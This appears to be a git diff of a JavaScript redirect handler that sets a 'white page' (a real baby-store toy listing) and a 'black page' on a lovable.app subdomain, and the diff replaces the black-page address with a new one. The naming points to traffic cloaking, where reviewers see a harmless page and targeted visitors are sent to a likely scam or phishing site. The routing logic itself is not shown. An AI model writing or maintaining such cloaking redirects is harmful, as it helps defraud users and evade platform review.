@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.babyshopstores.com/sa/en/Toys/Dolls-%26-Playsets/Doll-Playsets/BABYSHOP-Juniors-All-Over-Graphic-Print-Stroller-with-Doll-Playset/p/165228640";
-    const blackPageURL = "https://luvcshap.lovable.app/";
+    const blackPageURL = "https://casssshlov.lovable.app/?";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
